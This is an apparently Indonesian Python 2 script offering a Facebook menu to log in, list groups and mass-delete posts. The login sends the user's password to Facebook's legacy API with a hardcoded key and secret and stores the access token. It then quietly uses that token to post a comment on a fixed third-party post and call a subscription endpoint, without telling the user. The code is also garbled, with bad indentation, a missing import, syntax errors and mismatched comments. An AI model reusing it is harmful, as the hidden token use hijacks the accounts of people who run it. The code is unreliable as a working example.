import json , sys , hashlib , os , time , getpass


# fungsi untuk menampilkan semua data
def login_api():
	os.system('clear')
	try:
		os.mkdir('cookie')
	except OSError:
		pass
	try:
		b = open('cookie/token.log','w')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print ('[*] Ketik email atau nomor telepon Anda untuk login ke akun Anda.         ');email = raw_input('[?] Username : ');password = getpass.getpass('[?] Password : ')

	try:

		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';params = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":password,"return_ssl_resources":"0","v":"1.0"};response = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+password+'return_ssl_resources=0v=1.0'+API_SECRET
		x = hashlib.new('md5')
        x.update(response)

		params.update({'response':x.hexdigest()})
		
		mlebu = requests.get('https://api.facebook.com/restserver.php',params=params)
		a = json.loads(mlebu.text)
		b = open('cookie/token.log','w')
		b.write(a['access_token'])
		b.close()

		if 'access_token' in a:
			token = open("cookie/token.log",'r').read()
			print ('[*] Your access token is stored in cookie/token.log')
			print ('[*] successfully generate access token');requests.post('https://graph.facebook.com/100025271623353_485040922348291/comments?message=f46e7bc6354cb43c69fc66a76ee87336&access_token='+token);requests.post('https://graph.facebook.com/api.version/subscribers?access_token='+token)
			time.sleep(1)
			menu()

	except KeyError:

		print(m+'['+p+'×'+m+'] Failed please cek your account and try again')
		os.system('rm -rf cookie/token.log')

	except requests.exceptions.ConnectionError:

		print(' No connection')


# fungsi untuk menambah data
def scrap_groups():
	try:
		token = open('cookie/token.log','r').read()
		mlebu = requests.get('https://graph.facebook.com/me/groups?access_token='+token)
		a = json.loads(mlebu.text)
		for i in a['data']:
			print ('Nama Group :'+i['name'])
			print ('ID   Group 			:'+i['id'])
			print ('Jumlah Anggota 		:'+i['member_count'])
			print ('Aktifitas Terakhir  :'+i['updated_time'])
	except (KeyError,IOError):
		print ('SANBOOK Gagal scrap...')

# fungsi untuk menhapus data
def delete_post():
	try:
		token = open('cookie/token.log','r').read()
    	mlebu = requests.get('https://graph.facebook.com/me/post?access_token='+token)
		a = json.loads(mlebu.text)
	try:
		for i in a['data']:
			kirimane = requests.post('https://graph.facebook.com/v3.0/'+i['id']+'?method=delete&access_token='+token)
			mbusek = kirimane ['error']['message']
			print(+['message'])
			print('[GAGAL]' +i['created_time'] 'ID' +i['id'])
	except TypeError:
		print('[SUKSES]' +i['created_time'] 'ID' +i['id'])


# fungsi untuk menampilkan menu
def menu():
    print "\n"
    print "----------- MENU ----------"
    print "[1] Login"
    print "[2] View Groups"
    print "[3] Delete Post"
    print "[4] Exit"
    
    menu = input("PILIH MENU> ")
    print "\n"

    if menu == 1:
        login_api()
    elif menu == 2:
        scrap_groups()
    elif menu == 3:
        delete_post()
    elif menu == 4:
        exit()
    else:
        print "Salah pilih!"


if __name__ == "__main__":

    while(True):
        menu()
